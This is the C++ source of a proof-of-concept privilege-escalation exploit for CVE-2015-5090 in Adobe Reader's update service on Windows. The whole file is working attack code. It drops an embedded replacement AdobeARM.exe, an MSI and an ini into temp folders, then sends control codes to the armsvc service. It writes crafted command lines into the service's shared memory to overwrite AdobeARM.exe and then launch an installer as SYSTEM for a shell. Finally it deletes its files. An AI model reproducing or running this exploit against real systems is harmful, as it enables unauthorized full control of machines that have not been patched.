#include "stdafx.h"
#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <map>
#include <fstream>

/*
cve-2015-5090 Adobe Reader/Acrobat Pro privesc poc
bryan.alexander@fusionx.com

Supports Adobe Reader before and including 11.0.10
Tested on Windows 7 x64, should work on x86 as well
*/

#define BUFSIZE 512

#define SHARED_MEMORY_SIZE	7800
#define SVC_SM				0x000000AB
#define SVC_ELEVATE			0x000000B4

std::wstring SVC_NAME = L"AdobeARMservice";
std::wstring TEMP_DIR = L"C:\\Windows\\Temp\\YdydfsdZd\\";
std::wstring TEMP_DIRF = L"FOLDER:\"" + TEMP_DIR + L"\"";
std::wstring TEMP_DIR2 = L"C:\\Windows\\Temp\\slksdDSFdf\\";
std::wstring CLI_USER = std::wstring(487, '\0') + L"/ArmUpdate"; 
std::wstring MEM_HANDLE = L"Global\\{E8F34725-3471-4506-B28B-47145817B1AE}_";

// fetch PID of given process name
DWORD get_proc(std::wstring process)
{
	DWORD pid = -1;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, process.c_str()) == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	return pid;
}

// fetch and format volume serial number for SM
std::wstring GetVolumeSerialNumber()
{
	const WCHAR stand_buffer[] = L"thsnYaViMRAeBoda";
	WCHAR buffer[0x104];
	std::wstring wbuffer = L"";
	int radix = 0x0a;
	char szVolumeNameBuffer[261];
	DWORD dwVolumeSerialNumber;

	GetVolumeInformationW(_T("C:\\"), // hardcoded by reader
		(LPWSTR)szVolumeNameBuffer,
		261,
		&dwVolumeSerialNumber,
		NULL, NULL, NULL, NULL);

	_itow_s(dwVolumeSerialNumber, buffer, radix);
	if (lstrlenW(buffer) < 0x10)
	{
		// if we're < 16, concat the guid
		// GLOBAL\{....}_SERIALNUMBERthsnYaViMRAeBoda
		wbuffer += buffer;
		wbuffer += stand_buffer;
	}
	else
		wbuffer = std::wstring(buffer);

	return wbuffer;
}

// trigger armsvc with given service code
BOOL triggerControl(DWORD SVC_CODE)
{
	SC_HANDLE scm_handle, service_handle;
	SERVICE_STATUS_PROCESS ssp;

	scm_handle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (scm_handle == NULL)
	{
		wprintf(L"[-] Could not open SCManager! (%d)\n", GetLastError());
		return FALSE;
	}

	service_handle = OpenService(scm_handle, SVC_NAME.c_str(), SERVICE_USER_DEFINED_CONTROL);
	if (service_handle == NULL)
	{
		wprintf(L"[-] Could not get handle to service! (%d)\n", GetLastError());
		CloseServiceHandle(scm_handle);
		return FALSE;
	}

	// trigger service event
	if (!ControlService(service_handle, SVC_CODE, (LPSERVICE_STATUS)&ssp))
	{
		wprintf(L"[-] Failed to send control code to service! (%d)\n", GetLastError());
		CloseServiceHandle(service_handle);
		CloseServiceHandle(scm_handle);
		if (GetLastError() == 1053){
			wprintf(L"[!] Error caught as result of time out, pausing...\n");
			system("PAUSE");
			return TRUE;
		}
		else
			return FALSE;
	}

	CloseServiceHandle(service_handle);
	CloseServiceHandle(scm_handle);
	return TRUE;
}

// there's some caching issues with armsvc where it wont correctly read from the SM.
// i haven't figured out exactly what it is, but forcing a few more elevation requests
// seems to take care of it.  just check the size of our payload vs. the adobe arm and
// return true once we've overwritten it.  
BOOL overwritten()
{
	// check if we've copied over
	DWORD setup_size, curr_size, armpid = -1;
	HANDLE hSetup, hCurr;
	BOOL result = FALSE;
	std::wstring arm_path = L"C:\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe";

	armpid = get_proc(L"AdobeARM.exe");
	if (armpid != -1)
	{
		// AdobeARM.exe is already running, try to kill it
		HANDLE hwd = OpenProcess(PROCESS_TERMINATE, FALSE, armpid);
		if (hwd == NULL)
		{ 
			wprintf(L"[-] AdobeARM already running, and we can't kill it\n");
			return result;
		}

		TerminateProcess(hwd, 0);
		CloseHandle(hwd);
	}


	hSetup = CreateFile(L"C:\\Windows\\Temp\\YdydfsdZd\\AdobeARM.exe", 
						GENERIC_READ, 
						FILE_SHARE_READ, 
						NULL, 
						OPEN_EXISTING, 
						FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 
						NULL);

	// always installed to x86 
#if defined(WIN64)
	arm_path = L"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe";
#endif 
	BOOL is64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &is64);
	if (is64)
		arm_path = L"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe";

	hCurr = CreateFile(arm_path.c_str(),
						GENERIC_READ,
						FILE_SHARE_READ,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
						NULL);

	if (!hSetup || !hCurr)
	{
		// failed to open handles to the files
		goto cleanup;
	}
	
	setup_size = GetFileSize(hSetup, NULL);
	curr_size = GetFileSize(hCurr, NULL);
	if (setup_size == curr_size)
		result = TRUE;

cleanup:
	CloseHandle(hSetup);
	CloseHandle(hCurr);
	return result;
}

// delete the two temp folders
void cleanup()
{
	HANDLE hFile;
	WIN32_FIND_DATA fd;

	wprintf(L"[!] Cleaning up...\n");

	// remove temp dir 2
	hFile = FindFirstFileW((TEMP_DIR2 + L"*.*").c_str(), &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
				DeleteFileW((TEMP_DIR2 + fd.cFileName).c_str());
		} while (FindNextFileW(hFile, &fd));
		FindClose(hFile);
	}

	// remove temp dir 1
	hFile = FindFirstFileW((TEMP_DIR + L"*.*").c_str(), &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
				DeleteFileW((TEMP_DIR + fd.cFileName).c_str());
		} while (FindNextFileW(hFile, &fd));
		FindClose(hFile);
	}

	RemoveDirectoryW(TEMP_DIR2.c_str());
	RemoveDirectoryW(TEMP_DIR.c_str());
}

// we require two folders in tmp, one to point armsvc to, and another for our msi/ini.
// Create the two folders, and write out three files.
BOOL setup()
{
	std::map<std::wstring, int> RESOURCE_LIST = {
		{ L"asdf.ini", 100 },
		{ L"asdf.msi", 200 },
		{ L"AdobeARM.exe", 300 }
	};

	LPVOID resourcePtr;
	BOOL result = TRUE;
	HRSRC hResource;
	HGLOBAL hResourceData;
	HANDLE hFile;
	std::wstring path;
	DWORD iResourceSize, writtenSize;
	char *buf;

	// setup two directories for our AdobeARM.exe and MSI installer
	CreateDirectory(L"C:\\Windows\\Temp\\YdydfsdZd\\", NULL);
	CreateDirectory(TEMP_DIR2.c_str(), NULL);

	// write out our resources 
	for (auto const &ent1 : RESOURCE_LIST)
	{
		hResource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(ent1.second), RT_RCDATA);
		if (!hResource)
		{
			wprintf(L"[-] Could not find resource (%d)\n", ent1.second);
			return FALSE;
		}

		hResourceData = LoadResource(NULL, hResource);
		resourcePtr = LockResource(hResourceData);
		iResourceSize = SizeofResource(NULL, hResource);
		switch (ent1.second)
		{
		case 100:
			path = TEMP_DIR2 + ent1.first;
			break;
		case 200:
			path = TEMP_DIR2 + ent1.first;
			break;
		case 300:
			path = L"C:\\Windows\\Temp\\YdydfsdZd\\" + ent1.first;
			break;
		}

		hFile = CreateFile(path.c_str(),
				GENERIC_WRITE,
				0,
				NULL,
				CREATE_NEW,
				FILE_ATTRIBUTE_NORMAL,
				NULL
			);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not create file %s (%d)\n", path, GetLastError());
			result = FALSE;
			break;
		}

		WriteFile(hFile, resourcePtr, iResourceSize, &writtenSize, NULL);
		CloseHandle(hFile);
	}

	return result;
}

int _tmain(int argc, _TCHAR* argv[])
{
	std::wstring SERIAL_NUMBER;
	std::wstring command_line;
	DWORD armpid = -1, attempts = 0;
	HANDLE hMapFile;
	LPCTSTR pBuf;

	// create our empty copy directory
	wprintf(L"[!] Setting up temp directories and dropping files...\n");
	if(!setup())
		return -1;

	// grab PID of armsvc, or exit if not running
	wprintf(L"[!] Checking for armsvc...\n");
	armpid = get_proc(L"armsvc.exe");
	if (armpid == -1)
	{
		wprintf(L"[-] armsvc not found!\n");
		return -1;
	}

	// got PID and dirs created, trigger SM creation
	wprintf(L"[!] armsvc found (PID %d), triggering SharedMemory create...\n", armpid);
	if (!triggerControl(SVC_SM))
	{
		wprintf(L"[-] Exiting...\n");
		return -1;
	}

	// SM should be created, try getting a handle.
	// the generated SM should be MEM_HANDLE followed by the
	// concatenation of the root drive serial no and a hard coded string
	wprintf(L"[!] Grabbing SharedMemory handle...\n");
	SERIAL_NUMBER = GetVolumeSerialNumber();
	MEM_HANDLE.append(SERIAL_NUMBER);
	wprintf(L"[!] %s\n", MEM_HANDLE.c_str());

	hMapFile = OpenFileMapping(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, MEM_HANDLE.c_str());
	if (hMapFile == NULL)
	{
		wprintf(L"[-] Could not open handle to memory! (%d)\n", GetLastError());
		return -1;
	}

	pBuf = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEMORY_SIZE);
	if (pBuf == NULL)
	{
		wprintf(L"[-] Could not map view of file! (%d)\n", GetLastError());
		goto clean;
	}

	wprintf(L"[!] Shared memory mapped @ %08x\n", pBuf);
	wprintf(L"[!] Writing args to shared memory...\n");

	while (!overwritten() && attempts < 5)
	{
		memset((void*)pBuf, 0x00, SHARED_MEMORY_SIZE);

		command_line = TEMP_DIRF + CLI_USER;
		memcpy_s((void*)pBuf, SHARED_MEMORY_SIZE, command_line.c_str(), (command_line.size() * sizeof(wchar_t)));

		// trigger elevate to copy over setup.exe
		wprintf(L"[!] Triggering overwrite...\n");
		if (!triggerControl(SVC_ELEVATE))
		{
			wprintf(L"[-] Exiting...\n");
			goto clean;
		}

		Sleep(5000);
		attempts++;
	}

	if (attempts == 5)
	{
		wprintf(L"[-] Could not trigger overwrite; perhaps this isn't a vulnerable version?\n");
		goto clean;
	}

	// AdobeARM.exe overwritten, wipe SM and write in our arguments for setup.exe
	CLI_USER = std::wstring(487, '\0') + L"SYSTEM";
	command_line = TEMP_DIRF + CLI_USER + std::wstring(L" /sAll /ini \"C:\\Windows\\Temp\\slksdDSFdf\\asdf.ini\"");
	memset((void*)pBuf, 0x00, SHARED_MEMORY_SIZE);
	memcpy_s((void*)pBuf, SHARED_MEMORY_SIZE, command_line.c_str(), (command_line.size() * sizeof(wchar_t)));

	// retrigger SVC_ELEVATE
	wprintf(L"[!] Retriggering for shell...\n");
	if (!triggerControl(SVC_ELEVATE))
	{
		wprintf(L"[-] Exiting...\n");
		goto clean;
	}

	goto clean;

clean:
	UnmapViewOfFile(pBuf);
	CloseHandle(hMapFile);
	cleanup();
	return 0;
}

